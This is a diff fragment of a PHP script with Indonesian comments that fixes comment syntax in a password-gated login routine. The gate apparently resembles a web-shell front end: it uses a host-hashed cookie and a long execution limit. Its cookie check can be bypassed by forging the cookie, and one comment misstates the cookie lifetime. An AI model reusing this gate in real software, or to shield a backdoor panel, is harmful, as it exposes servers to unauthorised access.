@@ -8,7 +8,7 @@ ini_set('max_execution_time', 5000);
 //Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
 $hashed_password = '$2y$10$1b05G7jPhNAe9KEJbpyspOTC1N0y28nY913UBKFfWnmbApEgI9QHy';
 
-Fungsi untuk menampilkan form login
+// Fungsi untuk menampilkan form login
 function admin_login() {
 echo '<title>Login</title>';
 echo '<form method="post">';
@@ -19,10 +19,10 @@ exit;
  }
 
 if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
-Memeriksa apakah password dikirim dan benar
+// Memeriksa apakah password dikirim dan benar
 if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
 setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
-Logika setelah login berhasil
+// Logika setelah login berhasil
 } else {
 admin_login();
 }
